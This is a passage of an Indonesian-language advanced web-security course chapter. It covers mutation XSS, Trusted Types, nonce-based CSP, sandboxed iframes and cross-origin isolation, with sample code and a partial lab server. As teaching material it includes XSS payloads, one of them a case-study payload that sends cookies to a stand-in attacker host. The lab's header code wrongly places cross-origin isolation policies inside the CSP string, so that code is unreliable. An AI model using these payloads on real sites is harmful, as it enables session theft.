# Module 02 - Deep Dive, Implementasi Lanjutan & Arsitektur Produksi
**Bab 09: Keamanan HTML: Sanitasi DOM, CSP, dan Isolasi Sandbox**

---

## 1. Learning Objective

Setelah menyelesaikan modul ini, peserta didik pada level Enterprise Architect/Senior Engineer diharapkan mampu:

1. **Menganalisis dan Memitigasi Vektor Serangan DOM Canggih:** Mengidentifikasi celah *Mutation XSS* (mXSS), *Script Gadgets*, dan *Namespace Confusion* (SVG/MathML) pada siklus hidup parsing HTML browser modern.
2. **Merancang dan Mengimplementasikan W3C Trusted Types API:** Mengonfigurasi arsitektur pertahanan *type-enforced* tanpa celah bypass, mengunci sink DOM berbahaya (`innerHTML`, `outerHTML`, `script.src`), dan menerapkan *fallback* berbasis polyfill untuk lingkungan heterogen.
3. **Membangun Arsitektur Content Security Policy (CSP) Level 3 Berbasis Nonce:** Merancang pipeline CSP strict zero-trust dengan integrasi *dynamic per-request cryptographic nonces*, mitigasi injeksi CSS, serta konfigurasi pelaporan terpusat via `Reporting-Endpoints` / `report-to`.
4. **Mengisolasi Komponen Untrusted dan Mengaktifkan Cross-Origin Isolation:** Menerapkan strategi isolasi micro-frontend/third-party widget menggunakan atribut `iframe` sandbox modern, Cross-Origin Opener Policy (COOP), Cross-Origin Embedder Policy (COEP), dan Cross-Origin Resource Policy (CORP) guna mencegah eksfiltrasi spekulatif via serangan side-channel (Spectre).

---

## 2. Prerequisite

Sebelum menelaah materi lanjutan ini, pembaca wajib menguasai:

* **HTML Parser Internals:** Pemahaman mendalam tentang state machine HTML5 (tokenization, tree construction), penanganan tag asing (*foreign content*), dan perbedaan eksekusi parsing konteks normal vs *declarative shadow DOM*.
* **Modern JavaScript & DOM Core:** Penguasaan manipulasi Node/Element, Prototype Chain (`Element.prototype`), Shadow DOM, Custom Elements, dan Event Propagation phase.
* **HTTP Protocol & Security Primitives:** Mekanisme HTTP response headers, TLS, Same-Origin Policy (SOP), Cross-Origin Resource Sharing (CORS), dan HTTP/2 atau HTTP/3 streaming multiplexing.
* **Dasar Eksploitasi XSS:** Pemahaman praktis atas Reflected, Stored, dan Client DOM-based XSS, serta teknik dasar encoding (HTML entity encoding, URI encoding).

---

## 3. Concept & Internal Architecture (Mendalam)

### 3.1. Anatomi Parsing Browser dan Mekanisme Mutation XSS (mXSS)

Sebagian besar celah keamanan DOM modern bukan disebabkan oleh kelalaian sanitasi string sederhana, melainkan disparitas antara cara **library sanitasi mem-parse HTML** versus cara **browser rendering engine (Blink/WebKit/Gecko) mere-parse dan merender DOM Tree**.

```
[Untrusted Raw HTML String]
         │
         ▼
[HTML Tokenizer & State Machine]
         │
   Context Switching (HTML -> Foreign Content: SVG/MathML)
         │
         ▼
[DOM Tree Construction in Memory]
         │
    Round-trip Serialisasi (.innerHTML)
         │
         ▼
[Mutation Trigger: DOM Normalization / Tree Mutator]
         │
         ▼
[Re-tokenization oleh Browser Engine] ───> [Vektor XSS Tereksploitasi!]
```

Ketika string HTML disanitasi menggunakan DOM parser independen, parser tersebut membangun pohon dokumen internal. Bahaya muncul pada tahap **Re-serialization & Re-parsing**.

Contoh mXSS terjadi saat manipulasi *namespace boundary*. Tag `<math>` (MathML) atau `<svg>` mengubah parsing rules menjadi *foreign content rules*. Jika atribut atau tag tertentu ditutup secara salah, browser akan memuntahkan elemen HTML biasa keluar dari konteks foreign tersebut (*tree-mutation*). 

Sebagai contoh:
```html
<form>
  <math>
    <mtext>
      </form>
      <form>
        <mglyph>
          <style></math><img src=x onerror=alert(1)>
```
Ketika parser mengevaluasi markup di atas, interaksi antara closing tag form, MathML text content, dan pembukaan style tag yang memecah boundary parsing MathML memaksa string dievaluasi ulang saat di-assign ke `element.innerHTML`, sehingga event handler `onerror` tereksekusi.

### 3.2. W3C Trusted Types: Type-Safety pada DOM Sinks

Trusted Types menggeser paradigma keamanan web dari **pendeteksian berbasis heuristik/sanitasi pasif** menjadi **penegakan tipe statis/dinamis berbasis browser runtime**.

Secara default, browser mengekspos *injection sinks* seperti:
* **HTML Sinks:** `Element.innerHTML`, `Element.outerHTML`, `document.write()`.
* **Script Sinks:** `HTMLScriptElement.src`, dynamic `import()`, `eval()`, `setTimeout(string)`.
* **URL/Resource Sinks:** `HTMLIFrameElement.src`, `HTMLObjectElement.data`.

Tanpa Trusted Types, sink ini menerima tipe data primitif `string`. Trusted Types mencabut kemampuan sink menerima `string` telanjang melalui CSP header:

```http
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types dompurify-policy default;
```

#### Mekanisme Runtime Interception:
1. Setiap assignation string ke sink (misal: `el.innerHTML = untrustedInput`) diintersepsi oleh engine Blink/Gecko.
2. Engine memeriksa apakah nilai yang di-pass merupakan instans dari `TrustedHTML`, `TrustedScript`, atau `TrustedScriptURL`.
3. Jika nilai berupa `string` primitif dan policy default tidak dikonfigurasi, engine melemparkan `TypeError` fatal yang menghentikan eksekusi script sebelum parser browser menyentuh string tersebut.
4. Nilai hanya dapat diubah menjadi `Trusted*` melalui **Trusted Type Policy Factory** yang terdaftar secara sah menggunakan token/nama terverifikasi.

```
+-------------------------------------------------------------+
| Browser Runtime Execution Context                           |
|                                                             |
|   rawString ──> [Assignment: el.innerHTML = rawString]      |
|                              │                              |
|                              ▼                              |
|                [Trusted Types Policy Engine]                |
|                              │                              |
|         Is instance of TrustedHTML or Policy Available?     |
|                   /                     \                   |
|                 YES                      NO                 |
|                 /                         \                 |
|                ▼                           ▼                |
|      [Pass to HTML Parser]       [THROWS TYPEERROR FATAL]   |
|      (Render & Script Exec)      (Execution Blocked at Sink)|
+-------------------------------------------------------------+
```

### 3.3. Content Security Policy (CSP) Level 3 Strict Nonce Architecture

CSP Level 1 & 2 yang mengandalkan allowlist domain (seperti `script-src https://trusted.cdn.com`) telah usang dan terbukti rapuh terhadap *Script Gadgets* dan *JSONP bypass*. CSP Level 3 mengadopsi prinsip **Strict Nonce-based Policy**:

* Mengabaikan allowlist domain jika fallback `'strict-dynamic'` hadir pada parser yang kompatibel dengan CSP Level 3.
* Setiap respons HTTP harus memuat nilai nonce kriptografis acak (minimal 128-bit base64-encoded via secure CSPRNG).
* Tag inline script (`<script nonce="...">`) hanya dieksekusi jika atribut nonce cocok persis dengan nonce yang dideklarasikan pada HTTP response header sesi request tersebut.
* **Dynamic Trust Propagation:** Melalui `'strict-dynamic'`, script yang di-root dengan nonce valid diperbolehkan memuat script turunan (`document.createElement('script')`) tanpa harus mendaftarkan URL pihak ketiga di header.

### 3.4. Isolasi Proses: COOP, COEP, CORP, dan Site Isolation

Akibat kerentanan tingkat mikroarsitektur CPU (Spectre, Meltdown), isolasi memori antar origin dalam satu proses browser tidak lagi aman. Web security modern memindahkan batas isolasi ke level **Proses OS (Operating System Process-level Isolation)**.

* **Cross-Origin Opener Policy (COOP):** Mengisolasi *top-level window browsing context group*. Nilai `same-origin` memastikan bahwa dokumen yang dibuka via `window.open` atau navigasi lintas origin berjalan pada proses OS yang berbeda dan memutus relasi `window.opener`.
* **Cross-Origin Embedder Policy (COEP):** Nilai `require-corp` atau `credentialless` melarang dokumen memuat resource lintas origin apa pun yang tidak secara eksplisit memberikan izin melalui CORP atau CORS.
* **Cross-Origin Resource Policy (CORP):** Header pada resource (`same-origin`, `same-site`, `cross-origin`) yang memberi instruksi kepada browser apakah data mentah resource boleh dibaca oleh origin lain di dalam proses renderer.

Ketika COOP dan COEP aktif secara bersamaan, lingkungan eksekusi mendapatkan status **Cross-Origin Isolated** (`window.crossOriginIsolated === true`). Status ini membuka akses ke API performa tinggi yang memiliki resolusi timer presisi (yang sebelumnya dibatasi guna mencegah eksploitasi side-channel): `SharedArrayBuffer` dan `performance.measureUserAgentSpecificMemory()`.

---

## 4. Why & What

| Paradigma | Karakteristik Mekanisme | Kelemahan Utama | Kasus Penggunaan Ideal |
| :--- | :--- | :--- | :--- |
| **Naive Escaping (Regex / String Replace)** | Mengganti karakter `<`, `>`, `&`, `"`, `'` menjadi HTML entities. | Konteks ambivalen. Gagal total pada atribut tak berkutip, konteks URL (`href="javascript:..."`), dan context mutation. | Tidak direkomendasikan untuk aplikasi enterprise modern. |
| **Parser-Based Sanitization (DOMPurify via DOMParser)** | Mem-parse string ke DOM in-memory, membersihkan atribut dan node berdasarkan allowlist ketat, lalu men-serialisasi ulang. | Rawan terhadap celah *Mutation XSS* jika versi parser browser tidak selaras dengan rules engine DOMPurify; overhead performa serialisasi. | Pengolahan input Rich-Text Editor (WYSIWYG) sebelum injection. |
| **Runtime Enforcement (Trusted Types + Strict CSP)** | Mencegah assignment tipe data primitif ke level engine browser; script dieksekusi berdasarkan identitas kriptografis (*nonce*). | Membutuhkan refactoring kode legacy; ketergantungan pada dukungan browser (membutuhkan polyfill untuk platform non-Chromium). | Arsitektur zero-trust enterprise default untuk seluruh aplikasi web modern. |
| **Structural Isolation (`<iframe>` Sandbox + COOP/COEP)** | Mengisolasi memori dan hak akses dokumen ke proses sistem operasi dan konteks browsing terpisah. | Kompleksitas komunikasi lintas origin via `postMessage`; fragmentasi user session; limitasi layout. | Rendering untrusted user content, modul ekstensi pihak ketiga (third-party plugins). |

---

## 5. How (Workflow detail)

Pipeline pertahanan berlapis (Defense-in-Depth) dari ingress string hingga rendering DOM:

```
[Ingress: Payload HTML dari User / API]
                     │
                     ▼
[Tahap 1: Dynamic Nonce Injection]
- Backend meng-generate CSPRNG Nonce (128-bit)
- Injeksikan header CSP Level 3 ke HTTP Response
                     │
                     ▼
[Tahap 2: Runtime Initialization]
- Registrasi W3C Trusted Types Policy Factory
- Kunci `window.trustedTypes` agar tidak di-override (Object.freeze)
                     │
                     ▼
[Tahap 3: Parsing & Sanitization Phase]
- Parsing raw input menggunakan DOMPurify dengan konfigurasi aman
- Konversi output menjadi objek `TrustedHTML` via Trusted Types Policy
                     │
                     ▼
[Tahap 4: Ingestion ke DOM Sink]
- Eksekusi assignment via sink terproteksi: `element.innerHTML = trustedHTMLInstance`
- Browser memvalidasi token tipe data sebelum parsing engine Blink/Gecko
                     │
                     ▼
[Tahap 5: Runtime CSP & Sandbox Verification]
- CSP Engine memverifikasi script hash/nonce
- Sandboxed iframe mengisolasi storage access (Cookie/LocalStorage)
                     │
                     ▼
[Render Selesai / Aman dari XSS]
```

---

## 6. Analogy & Diagram ASCII

Bayangkan sanitasi dan isolasi HTML seperti **Prosedur Pengolahan Material Berbahaya di Laboratorium Tingkat Tinggi (BSL-4)**:

* **Naive Escaping** seperti membersihkan material beracun dengan tisu biasa di tempat terbuka. Partikel mikro masih berterbangan dan lolos (*bypass*).
* **DOMPurify** adalah ruang dekontaminasi bertingkat. Setiap zat asing diperiksa satu per satu sesuai katalog zat aman.
* **Trusted Types** adalah sistem kunci digital berkode spesifik. Mesin laboratorium (DOM Sinks) menolak menerima tabung reaksi apa pun kecuali tabung tersebut disegel dengan stempel sertifikasi resmi (`TrustedHTML`).
* **Strict CSP Nonce** adalah lencana tanda pengenal berkode dinamis yang berubah setiap hari. Siapa pun di dalam gedung yang tidak memiliki lencana yang cocok dengan sistem hari itu langsung dilumpuhkan secara otomatis oleh sistem keamanan internal.
* **Sandbox & COOP/COEP** adalah bilik kaca hermetis kedap suara dengan sistem sirkulasi udara mandiri. Jika bahan di dalamnya meledak, ledakan tersebut tertahan sepenuhnya di dalam bilik kaca tanpa merusak struktur gedung utama.

### Diagram Isolasi Proses Browser

```
+-----------------------------------------------------------------------------------+
| BROWSER PROCESS ARCHITECTURE                                                      |
|                                                                                   |
|  [Main Enterprise App Process: https://corp.bank.com]                             |
|  +-----------------------------------------------------------------------------+  |
|  | Window Scope (COOP: same-origin, COEP: require-corp)                        |  |
|  |                                                                             |  |
|  |  Trusted Types Enforcement Engine: ON                                       |  |
|  |  CSP Level 3: script-src 'nonce-R4nd0m...' 'strict-dynamic'                 |  |
|  |                                                                             |  |
|  |  DOM Sink (innerHTML) <--- [TrustedHTML Only]                               |  |
|  |                                                                             |  |
|  |  +-----------------------------------------------------------------------+  |  |
|  |  | <iframe sandbox="allow-scripts" src="https://sandbox.bank.com">      |  |  |
|  +--+--+--------------------------------------------------------------------+--+--+
|        |                                                                          |
|        | Cross-Process IPC (postMessage strictly typed/validated)                 |
|        v                                                                          |
|  [Isolated OS Renderer Process: https://sandbox.bank.com]                         |
|  +-----------------------------------------------------------------------------+  |
|  | Window Scope (Unique Origin: null context)                                  |  |
|  | Restricted APIs: No LocalStorage, No Session Cookies, No Parent Access      |  |
|  | Render untrusted rich text, SVG rendering, dynamic templates                 |  |
|  +-----------------------------------------------------------------------------+  |
+-----------------------------------------------------------------------------------+
```

---

## 7. Simple Example & Practical Example

### 7.1. Simple Example: Insecure Sink vs Trusted Types Native Protection

#### Kode Rentan (Anti-pattern):
```javascript
// Input berbahaya dari URL query parameter
const searchParams = new URLSearchParams(window.location.search);
const untrustedName = searchParams.get('name'); // misal: <img src=x onerror=alert(1)>

// DOM Sink rentan dieksploitasi
document.getElementById('greeting').innerHTML = "Halo, " + untrustedName;
```

#### Solusi Refaktor Standar Industri:
```html
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <!-- Blokir assign string langsung ke script dan HTML sinks -->
  <meta http-equiv="Content-Security-Policy" content="require-trusted-types-for 'script';">
  <title>Trusted Types Enforcement</title>
</head>
<body>
  <div id="greeting"></div>

  <script>
    // Inisialisasi Trusted Type Policy
    const escapePolicy = window.trustedTypes?.createPolicy('escape-policy', {
      createHTML: (string) => {
        return string
          .replace(/&/g, "&amp;")
          .replace(/</g, "&lt;")
          .replace(/>/g, "&gt;")
          .replace(/"/g, "&quot;")
          .replace(/'/g, "&#039;");
      }
    }) ?? { createHTML: (s) => s }; // Fallback jika browser belum mendukung

    const searchParams = new URLSearchParams(window.location.search);
    const untrustedName = searchParams.get('name') || 'Tamu';

    // Type error akan dilempar secara otomatis jika kita mencoba meng-assign raw string:
    // document.getElementById('greeting').innerHTML = untrustedName; // THROWS ERROR!

    // Aman: Menyerahkan tipe data yang sudah divalidasi oleh policy
    document.getElementById('greeting').innerHTML = escapePolicy.createHTML(untrustedName);
  </script>
</body>
</html>
```

---

### 7.2. Practical Example: Enterprise Rich-Text Document Rendering Pipeline

Implementasi pipeline produksi modular berskala enterprise yang mengombinasikan DOMPurify, konfigurasi Trusted Types kustom, hook sanitasi atribut interaktif, dan mitigasi CSS Injection.

```javascript
/**
 * Core Security Sanitization Module (ESM)
 * File: /src/security/sanitizer.js
 */
import DOMPurify from 'dompurify';

class SecuritySanitizerEngine {
  #trustedPolicy = null;
  #isInitialized = false;

  constructor() {
    this.#initPolicy();
    this.#configurePurifyHooks();
  }

  #initPolicy() {
    if (this.#isInitialized) return;

    if (window.trustedTypes && window.trustedTypes.createPolicy) {
      try {
        this.#trustedPolicy = window.trustedTypes.createPolicy('enterprise-security-policy', {
          createHTML: (rawHtml) => this.#sanitizeWithDOMPurify(rawHtml),
          createScriptURL: (rawUrl) => {
            const parsed = new URL(rawUrl, window.location.origin);
            const trustedDomains = ['https://cdn.enterprise.com', 'https://static.enterprise.com'];
            
            if (trustedDomains.includes(parsed.origin)) {
              return parsed.href;
            }
            throw new URIError(`[SECURITY BLOCKED]: Script URL lintas origin tidak diizinkan: ${rawUrl}`);
          },
          createScript: () => {
            throw new Error('[SECURITY BLOCKED]: Dynamic inline script creation dilarang total.');
          }
        });
      } catch (err) {
        console.warn('[SECURITY] Kebijakan Trusted Types sudah didaftarkan sebelumnya:', err);
      }
    }
    this.#isInitialized = true;
  }

  #configurePurifyHooks() {
    // Hook 1: Paksa rel="noopener noreferrer" pada semua anchor tag untuk mencegah reverse tabnabbing
    DOMPurify.addHook('afterSanitizeAttributes', (node) => {
      if (node.tagName === 'A' && node.hasAttribute('href')) {
        node.setAttribute('rel', 'noopener noreferrer');
        node.setAttribute('target', '_blank');
        
        // Blokir protokol javascript: atau data: pada link href
        const href = node.getAttribute('href');
        if (/^\s*(javascript|data):/i.test(href)) {
          node.removeAttribute('href');
        }
      }

      // Hook 2: Mitigasi CSS Exfiltration Attack pada inline style
      if (node.hasAttribute('style')) {
        const style = node.getAttribute('style');
        // Tangkal referensi background URL yang dapat mengeksfiltrasi CSRF token via CSS
        if (/url\s*\(/i.test(style)) {
          node.removeAttribute('style');
        }
      }
    });

    // Hook 3: Netralkan custom tags yang berpotensi memicu prototype pollution
    DOMPurify.addHook('uponSanitizeElement', (node, data) => {
      if (data.tagName && data.tagName.includes('-')) {
        // Blokir custom elements yang tidak masuk whitelist internal
        const allowedCustomElements = ['enterprise-data-card', 'enterprise-chart'];
        if (!allowedCustomElements.includes(data.tagName)) {
          node.remove();
        }
      }
    });
  }

  #sanitizeWithDOMPurify(rawHtml) {
    return DOMPurify.sanitize(rawHtml, {
      ALLOWED_TAGS: [
        'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'p', 'b', 'i', 'strong', 'em', 'strike',
        'ul', 'ol', 'li', 'table', 'thead', 'tbody', 'tr', 'th', 'td', 'span', 'div',
        'code', 'pre', 'blockquote', 'a', 'enterprise-data-card'
      ],
      ALLOWED_ATTR: ['href', 'title', 'class', 'id', 'data-id', 'style'],
      ALLOW_DATA_ATTR: true,
      FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'style', 'template', 'base'],
      FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'],
      RETURN_DOM_FRAGMENT: false,
      RETURN_DOM: false
    });
  }

  /**
   * Mengembalikan objek TrustedHTML jika didukung, atau string tersanitasi
   * @param {string} rawHtml 
   * @returns {TrustedHTML|string}
   */
  sanitizeToTrusted(rawHtml) {
    if (this.#trustedPolicy) {
      return this.#trustedPolicy.createHTML(rawHtml);
    }
    // Fallback untuk browser non-Chromium yang belum mendukung W3C Trusted Types
    return this.#sanitizeWithDOMPurify(rawHtml);
  }
}

export const securitySanitizer = new SecuritySanitizerEngine();
```

#### Penggunaan pada UI Component View Layer:
```javascript
import { securitySanitizer } from '/src/security/sanitizer.js';

export function renderUserDashboardWidget(containerElement, userPayload) {
  if (!containerElement || !(containerElement instanceof HTMLElement)) {
    throw new TypeError('Container harus berupa instans valid HTMLElement');
  }

  // Raw input dari webhook pihak ketiga / database
  const untrustedMarkup = userPayload.richDescription;

  // Sanitasi terpusat yang menghasilkan TrustedHTML
  const safeDOM = securitySanitizer.sanitizeToTrusted(untrustedMarkup);

  // Browser sink sekarang aman dan tidak memicu policy violation
  containerElement.innerHTML = safeDOM;
}
```

---

## 8. Real World Case Study (Enterprise Scale)

### Kasus: Insiden Penetrasi Layanan FinTech "PayGlobal Cloud" (Multi-Tenant Dashboard)

#### Latar Belakang Masalah
PayGlobal Cloud menyediakan fitur kustomisasi invoice untuk jutaan merchant UMKM hingga enterprise. Fitur invoice memungkinkan merchant menambahkan template deskripsi pembayaran menggunakan editor teks kaya (WYSIWYG) yang mendukung rendering HTML & SVG badges.

#### Vektor Celah Keamanan (Vulnerability Root Cause)
1. Merchant menggunakan DOMPurify versi `2.0.x` tanpa penanganan isolasi tag MathML/SVG namespace boundary.
2. Penyerang menyisipkan payload mXSS dengan teknik context-switching:
   ```html
   <svg><style><g title="</style><img src=x onerror=fetch('https://attacker.io/leak?c='+document.cookie)>">
   ```
3. Saat DOMPurify membaca potongan kode, state SVG validator menganggap node `<style>` tersebut legal dan terisolasi. Namun ketika diinjeksikan ke dokumen utama menggunakan `div.innerHTML = payload`, browser Blink men-serialisasi ulang DOM dan menutup tag style lebih cepat karena presence quote escape issue, menyebabkan tag `<img>` terefleksi sebagai native DOM element dan mengeksekusi script.
4. CSP yang diterapkan saat itu menggunakan CSP Level 2 domain allowlist yang longgar:
   ```http
   Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com;
   ```
5. Penyerang menyalahgunakan endpoint AngularJS kuno yang di-host di `cdnjs` untuk memicu Script Gadget (*Angular Client-Side Template Injection*) yang mengeksekusi arbitrary code tanpa membutuhkan inline script.

#### Solusi dan Arsitektur Remediasi Komprehensif
1. **Penerapan CSP Level 3 Strict Nonce Architecture:**
   Allowlist domain dihapus seluruhnya. CSP diganti menjadi:
   ```http
   Content-Security-Policy:
     default-src 'none';
     script-src 'nonce-dGhpcy1pcy1hLXNlY3VyZS1ub25jZQ==' 'strict-dynamic';
     style-src 'self' 'nonce-dGhpcy1pcy1hLXNlY3VyZS1ub25jZQ==';
     img-src 'self' data: https://static.payglobal.com;
     font-src 'self';
     connect-src 'self' https://api.payglobal.com;
     frame-src 'self' https://sandbox.payglobal.com;
     require-trusted-types-for 'script';
     trusted-types payglobal-dompurify default;
     base-uri 'none';
     form-action 'self';
     report-to cso-endpoint;
   ```
2. **Karantina Template Rendering via Sandboxed iFrame:**
   Seluruh input kaya yang diunggah oleh merchant dipindahkan proses parsing-nya ke origin terisolasi `https://sandbox.payglobal.com` menggunakan iframe:
   ```html
   <iframe 
     src="https://sandbox.payglobal.com/render-invoice" 
     sandbox="allow-scripts" 
     referrerpolicy="no-referrer">
   </iframe>
   ```
   *Catatan Arsitektur:* Perhatikan bahwa atribut `allow-same-origin` **tidak digunakan** bersamaan dengan `allow-scripts` agar iframe beroperasi dalam origin unik (`null`), mengeliminasi akses ke token sesi atau local storage `payglobal.com`.
3. **Hasil Remediasi:**
   Upaya mXSS berikutnya diblokir di dua level:
   * Engine browser memutus assignment via Trusted Types Violation.
   * Jika parser dieksploitasi, iframe sandbox membatasi cakupan script tanpa izin akses cookie dan token autentikasi. Zero data-exfiltration tercapai.

---

## 9. Trade-offs

| Pendekatan / Teknologi | Keuntungan (Pros) | Biaya Teknis & Trade-offs (Cons) |
| :--- | :--- | :--- |
| **Strict Nonce-Based CSP Level 3** | Mengeliminasi serangan bypass allowlist domain; mematikan injeksi script pihak ketiga secara sistemik. | **Latency & Cacheability:** Respons HTML tidak dapat lagi di-cache secara publik di edge CDN (Varnish/Cloudflare) tanpa implementasi Edge Side Includes (ESI) atau dynamic header rewrites untuk menyuntikkan nonce unik per-request. |
| **W3C Trusted Types API** | Menutup celah DOM XSS secara langsung di tingkat engine browser. Memberikan visibility 100% pada semua mutasi sink. | **Refactoring Drag:** Kompatibilitas mundur rendah. Library legacy (misal: jQuery, plugin lawas) yang menggunakan `innerHTML` mentah akan langsung *crash* (*throw TypeError*). |
| **DOM Sanitization Hooks Ketat** | Mencegah eksfiltrasi data via CSS atau SVG foreign namespace confusion secara presisi. | **Throughput Overhead:** Sanitasi client-side berskala besar pada dokumen panjang memperlambat thread UI utama (*Main Thread blocking*), berpotensi mendegradasi skor performa Core Web Vitals (INP - Interaction to Next Paint). |
| **Process Isolation (COOP + COEP)** | Memberikan perlindungan mitigasi Spectre; membuka akses API high-performance seperti `SharedArrayBuffer`. | **Asset Friction:** Mengharuskan **seluruh** aset lintas-origin (gambar dari external CDN, embed YouTube/Maps) menyertakan header CORS/CORP yang valid. Aset pihak ketiga tanpa header ini akan diblokir total oleh browser (*blank screen*). |

---

## 10. Common Mistakes & Troubleshooting

### 10.1. Common Mistakes (Anti-Patterns)

#### Mistake 1: Menggabungkan `allow-scripts` dan `allow-same-origin` pada iFrame Sandbox
```html
<!-- KESALAHAN FATAL -->
<iframe src="untrusted.html" sandbox="allow-scripts allow-same-origin"></iframe>
```
*Dampak:* Halaman di dalam iframe memiliki origin yang sama dengan halaman induk **dan** memiliki izin eksekusi script. Script jahat dapat memanggil API:
```javascript
window.parent.document.cookie; // Akses penuh ke parent context!
// Atau bahkan mencabut sandbox attribute secara programatis!
```

#### Mistake 2: Sanitasi Input *Sebelum* Data Disimpan ke Database (Pre-storage Sanitization Only)
*Dampak:* Sanitasi hanya di backend saat request masuk berpotensi mengalami inkonsistensi. Jika versi parser browser berubah di masa depan dan memunculkan mutasi mXSS baru, data yang tersimpan di DB sudah tidak bisa dievaluasi ulang. Database harus selalu menyimpan raw semantic source, sedangkan sanitasi harus ditegakkan pada boundary render / ingestion interface.

#### Mistake 3: CSP Hash Mismatch Akibat Karakter Whitespace
Ketika menggunakan hash-based CSP (`script-src 'sha256-abc...'`), perubahan satu spasi, newline (CRLF vs LF), atau tabulasi akan mengubah checksum sha256 seluruhnya, mengakibatkan script valid terblokir senyap (*silent failure*).

### 10.2. Troubleshooting Guide: Debugging Trusted Types Violations

Jika aplikasi mendadak melempar error:
`Uncaught TypeError: Failed to set the 'innerHTML' property on 'Element': This document requires 'TrustedHTML' assignment.`

Lakukan langkah diagnosa berikut:

1. **Aktifkan Breakpoint Otomatis di Chrome DevTools:**
   * Buka DevTools -> Panel **Sources**.
   * Buka tab **CSP Violation Breakpoints** pada accordion kanan.
   * Centang centang checkbox: **Trusted Type Violations** dan **Sink Violations**.
2. **Telusuri Stack Trace:**
   * Amati baris kode yang memicu pemanggilan sink. Identifikasi vendor modul atau script pelakunya.
3. **Konfigurasikan Kebijakan Fallback (Default Policy) Sementara:**
   Jika error dipicu oleh third-party script yang tidak bisa langsung diubah, pasang kebijakan `default` yang mencatat ke Sentry / endpoint monitoring tanpa merusak layout:
   ```javascript
   if (window.trustedTypes && window.trustedTypes.defaultPolicy === null) {
     window.trustedTypes.createPolicy('default', {
       createHTML: (string) => {
         console.warn('[SECURITY VIOLATION DETECTED AT SINK]:', string);
         // Teruskan ke DOMPurify di production
         return DOMPurify.sanitize(string);
       }
     });
   }
   ```

---

## 11. Best Practices (Production Checklist)

### Security Engineering Audit Matrix

- [ ] **Content Security Policy (CSP)**
  - [ ] Header didefinisikan via HTTP response header, **bukan** via tag `<meta>` (agar dapat memvalidasi directive `frame-ancestors`, `report-to`, dan sandbox policies).
  - [ ] Menggunakan CSP Level 3: `script-src 'nonce-{RANDOM}' 'strict-dynamic'`.
  - [ ] Menyetel directive fallback: `object-src 'none'; base-uri 'none'; form-action 'self';`.
  - [ ] Endpoint pelaporan pelanggaran terpasang menggunakan header `Reporting-Endpoints`.

- [ ] **DOM & Trusted Types**
  - [ ] Header memuat directive `require-trusted-types-for 'script'`.
  - [ ] Mencegah policy hijacking dengan membatasi nama policy: `trusted-types app-sanitizer app-template;`.
  - [ ] Mengunci global factory: eksekusi `Object.freeze(window.trustedTypes)` setelah registrasi policy kritis selesai.
  - [ ] Memastikan tidak ada pengabaian tipe via casting string eksplisit tanpa sanitasi.

- [ ] **Isolasi Lingkungan (Isolation Sandbox)**
  - [ ] Semua konten dinamis dari pengguna (UGC) yang memiliki format HTML/Rich Text dirender di dalam subdomain terpisah (contoh: `user-content.example.com`).
  - [ ] Iframe penguji memiliki atribut sandbox ketat: `sandbox="allow-scripts"` (tanpa `allow-same-origin`).
  - [ ] Mengaktifkan isolasi spekulatif memori via headers:
    - [ ] `Cross-Origin-Opener-Policy: same-origin`
    - [ ] `Cross-Origin-Embedder-Policy: require-corp`
    - [ ] `Cross-Origin-Resource-Policy: same-origin`

- [ ] **Sanitizer Hygiene**
  - [ ] Library DOMPurify di-update secara otomatis via Dependabot/Renovate dengan pengujian otomatis terhadap test-suite mXSS terkini.
  - [ ] Atribut link (`<a href>`) selalu dipaksa memiliki `rel="noopener noreferrer"`.
  - [ ] Karakter kontrol CSS (seperti `url()`, `@import`, `-moz-binding`) dibersihkan total dari atribut inline style.

---

## 12. Hands-on Practice

Dalam latihan ini, Anda akan membangun mini production server yang menyajikan HTML dengan strict nonce-based CSP, mengonfigurasi Trusted Types, dan menangkap pelanggaran CSP.

### Persiapan Direktori Praktikum
Buat struktur direktori untuk file latihan:
```bash
mkdir -p hands-on/m02
cd hands-on/m02
npm init -y
npm install express helmet crypto dompurify jsdom
```

### Langkah 1: Implementasi Enterprise Hardened Server
Simpan sebagai `hands-on/m02/server.js`:

```javascript
const express = require('express');
const crypto = require('crypto');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware JSON parser untuk menangkap CSP Violation Reports
app.use(express.json({ type: ['application/json', 'application/csp-report', 'application/reports+json'] }));

// Sajikan static assets
app.use('/static', express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => {
  // Generate 128-bit Cryptographically Secure Pseudorandom Nonce
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;

  // Konfigurasi HTTP Headers Pertahanan Berlapis
  res.setHeader(
    'Content-Security-Policy',
    `default-src 'none'; ` +
    `script-src 'nonce-${nonce}' 'strict-dynamic' 'unsafe-inline' https:; ` +
    `style-src 'self' 'nonce-${nonce}'; ` +
    `img-src 'self' data:; ` +
    `connect-src 'self'; ` +
    `require-trusted-types-for 'script'; ` +
    `trusted-types secure-render default; ` +
    `Cross-Origin-Opener-Policy 'same-origin'; ` +
    `Cross-Origin-Embedder-Policy 'require-corp'; ` +
    `Cross-Origin-Resource-Policy 'same-origin'; ` +
    `base-uri 'none'; ` +
    `object-src 'none'; ` +
    `report-uri /api/csp-report-endpoint;`
  );

  next();
});

// Endpoint untuk menerima laporan pelanggaran CSP
app.post('/api/csp-report-endpoint', (req, res) => {
  console.error('\n🚨 [CSP VIOLATION OBSERVED AT MONITORING LAYER]:');
  console.error(JSON.stringify(req.body, null, 2));
  console.error('──────────────────────────────────────────────────\n');
  res.status(204).end();
});

// HTML Document Route
app.get('/', (req, res) => {
  const nonce = res.locals.nonce;
  
  res.send(`<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Enterprise Security Lab: Trusted Types & CSP</title>
  <style nonce="${nonce}">
    body { font-family: monospace; padding: 2rem; background: #0f172a; color: #f8fafc; }
    .card { background: #1e293b; padding: 1.5rem; border-radius: 8px; margin-bottom: 1rem; border: 1px solid #334155; }
    .btn { background: #3b82f6; color: white; border: none; padding: 0.5rem 1rem; cursor: pointer; border-radius: 4px; }
    .danger { background: #ef4444; }
  </style>
  <!-- Load DOMPurify via static routing lokal dengan Nonce Valid -->
